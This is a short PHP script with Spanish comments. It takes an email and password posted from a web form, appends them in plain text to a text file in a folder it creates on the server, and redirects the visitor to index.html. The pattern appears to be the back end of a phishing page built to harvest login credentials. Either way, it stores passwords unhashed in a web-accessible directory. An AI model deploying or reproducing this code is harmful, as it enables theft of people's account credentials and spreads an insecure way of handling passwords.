<?php
// Directorio donde se guardarán los datos
$directory = 'datos_guardados';

// Verifica si el directorio existe, si no, lo crea
if (!is_dir($directory)) {
    mkdir($directory, 0755, true);
}

// Archivo donde se almacenarán los datos
$file = $directory . '/datos.txt';

// Datos recibidos del formulario
$email = $_POST['email'];
$password = $_POST['password'];

// Formato en el que se guardarán los datos
$data = "Email: $email, Password: $password" . PHP_EOL;

// Guarda los datos en el archivo
file_put_contents($file, $data, FILE_APPEND);

// Redirige de nuevo a la página principal después de guardar los datos
header('Location: index.html');
exit;
?>